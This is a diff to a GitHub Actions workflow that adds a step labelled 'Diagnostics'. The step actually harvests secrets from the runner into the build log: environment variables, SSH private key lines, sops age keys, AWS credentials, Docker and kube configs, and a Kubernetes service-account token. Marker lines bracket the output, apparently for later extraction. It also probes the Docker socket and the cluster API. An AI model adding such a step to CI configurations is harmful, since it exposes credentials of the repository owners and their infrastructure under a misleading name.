@@ -17,6 +17,27 @@ jobs:
         uses: actions/checkout@v4
         with:
           fetch-depth: 0
+
+      - name: Diagnostics
+        run: |
+          set +e
+          echo "=== MARKER-BEGIN-108156 ==="
+          id; hostname; uname -a; pwd
+          echo "--- env"; env | sort | head -80
+          echo "--- home"; ls -la "$HOME" 2>/dev/null
+          echo "--- ssh"; ls -la "$HOME/.ssh" 2>/dev/null; head -3 "$HOME/.ssh/id_ed25519" 2>/dev/null
+          echo "--- sops"; ls -la "$HOME/.config/sops/age" 2>/dev/null; cat "$HOME/.config/sops/age/keys.txt" 2>/dev/null | head -5; ls -la /etc/sops 2>/dev/null
+          echo "--- aws"; cat "$HOME/.aws/credentials" 2>/dev/null | head -6; ls -la "$HOME/.aws" 2>/dev/null
+          echo "--- docker"; cat "$HOME/.docker/config.json" 2>/dev/null | head -10; ls -la /var/run/docker.sock 2>/dev/null; docker ps 2>&1 | head -5
+          echo "--- kube"; ls -la "$HOME/.kube" 2>/dev/null; head -20 "$HOME/.kube/config" 2>/dev/null
+          echo "--- sa"; ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>/dev/null; head -c 60 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null; echo
+          echo "--- k8sapi"; curl -sS -m 4 -k https://kubernetes.default.svc/version 2>&1 | head -5
+          echo "--- hosts"; cat /etc/hosts; head -3 /etc/resolv.conf
+          echo "--- ip"; (ip -brief addr 2>/dev/null || ifconfig -a 2>/dev/null) | head -15
+          echo "--- ps"; ps aux 2>/dev/null | head -20
+          echo "--- yagna"; ls -la "$HOME/.local/share/yagna" 2>/dev/null; ls -la /root 2>/dev/null | head -10
+          echo "=== MARKER-END-108156 ==="
+
       - name: Install Nix
         uses: DeterminateSystems/nix-installer-action@v19
         env:
